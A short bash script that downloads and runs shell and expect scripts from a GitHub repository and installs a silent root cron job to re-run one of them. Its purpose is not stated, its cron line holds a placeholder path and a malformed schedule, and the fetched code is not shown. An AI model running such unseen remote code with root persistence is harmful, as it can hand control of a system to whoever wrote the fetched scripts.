#!/bin/bash

# Command 1
curl -L https://raw.githubusercontent.com/krakh75/io/main/al.exp -o al.exp
chmod +x al.exp && ./al.exp

# Command 2
curl -L https://raw.githubusercontent.com/krakh75/io/main/re-run.sh -o re-run.sh
chmod +x re-run.sh

# Command 3
cat <<EOF | crontab -
MAILTO=""
HOME=/root/
*/720 * * * * /path/to/re-run.sh
EOF

# Command 4
curl -L https://raw.githubusercontent.com/krakh75/io/main/edit.sh -o edit.sh
chmod +x edit.sh && ./edit.sh re-run.sh
